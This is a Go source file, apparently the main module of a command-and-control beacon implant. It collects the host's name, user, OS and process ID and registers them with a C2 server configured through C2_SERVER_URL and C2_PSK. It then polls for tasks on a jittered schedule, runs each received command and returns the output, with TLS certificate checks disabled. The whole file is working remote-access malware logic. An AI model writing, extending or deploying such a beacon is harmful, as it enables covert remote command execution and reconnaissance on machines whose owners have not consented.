package main

import (
	"crypto/rand"
	"crypto/tls"
	"fmt"
	"math/big"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"time"
)

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "fatal: %v\n", err)
		os.Exit(1)
	}
}

func run() error {
	if err := initCrypto(); err != nil {
		return err
	}

	info := collectBeaconInfo()
	client := NewHTTPClient(GetServerURL())

	if info.ID == "" {
		info.ID = GenerateUUID()
	}

	// ── Phase 2: X25519 key exchange ──────────────────────────────
	// Attempt ephemeral handshake; fall back to PSK if server doesn't
	// support it (404) or connection fails.
	handshakeOK := false
	if err := client.Handshake(); err != nil {
		fmt.Fprintf(os.Stderr, "handshake failed (falling back to PSK): %v\n", err)
	} else {
		handshakeOK = true
		fmt.Fprintf(os.Stderr, "handshake OK | session key established\n")
	}

	// ── Register with server ──────────────────────────────────────
	resp, err := client.Register(info)
	if err != nil {
		return err
	}

	sleepInterval := resp.SleepInterval
	jitter := resp.Jitter

	proto := "PSK"
	if handshakeOK {
		proto = "X25519"
	}
	fmt.Fprintf(os.Stderr, "beacon %s online | %s | poll every %ds +/-%.0f%%\n",
		resp.BeaconID, proto, sleepInterval, jitter*100)

	// ── Main beacon loop ──────────────────────────────────────────
	for {
		tasks, err := client.Poll()
		if err != nil {
			fmt.Fprintf(os.Stderr, "poll error: %v\n", err)
			time.Sleep(jitteredSleep(sleepInterval, jitter))
			continue
		}

		for _, task := range tasks {
			output, errStr, status := executeTask(task)
			_ = client.SubmitResult(task.ID, output, errStr, status)
		}

		time.Sleep(jitteredSleep(sleepInterval, jitter))
	}
}

func collectBeaconInfo() *BeaconInfo {
	hostname, _ := os.Hostname()
	pid := os.Getpid()
	currentUser, _ := user.Current()

	return &BeaconInfo{
		ID:            GenerateUUID(),
		Hostname:      hostname,
		Username:      currentUser.Username,
		OS:            runtime.GOOS,
		Arch:          runtime.GOARCH,
		PID:           pid,
		SleepInterval: 5,
		Jitter:        0.3,
	}
}

func executeTask(task Task) (string, string, string) {
	cmd := exec.Command(task.Command, task.Args...)
	output, err := cmd.CombinedOutput()

	if err != nil {
		return string(output), err.Error(), "failed"
	}
	return string(output), "", "complete"
}

func jitteredSleep(base int, jitterFactor float64) time.Duration {
	ms := float64(base) * 1000
	maxJitter := ms * jitterFactor
	offset := maxJitter * (2*randomFloat() - 1)
	return time.Duration(ms+offset) * time.Millisecond
}

func randomFloat() float64 {
	n, err := rand.Int(rand.Reader, big.NewInt(10000))
	if err != nil {
		return 0.5
	}
	return float64(n.Int64()) / 10000.0
}

// InsecureTLSConfig allows self-signed certs (MVP only — replace with proper CA in prod)
func InsecureTLSConfig() *tls.Config {
	return &tls.Config{
		InsecureSkipVerify: true, // #nosec
	}
}

// init overrides, potentially from build ldflags
func init() {
	if s := os.Getenv("C2_SERVER_URL"); s != "" {
		serverURL = s
	}
	if s := os.Getenv("C2_PSK"); s != "" {
		pskHex = s
	}
}
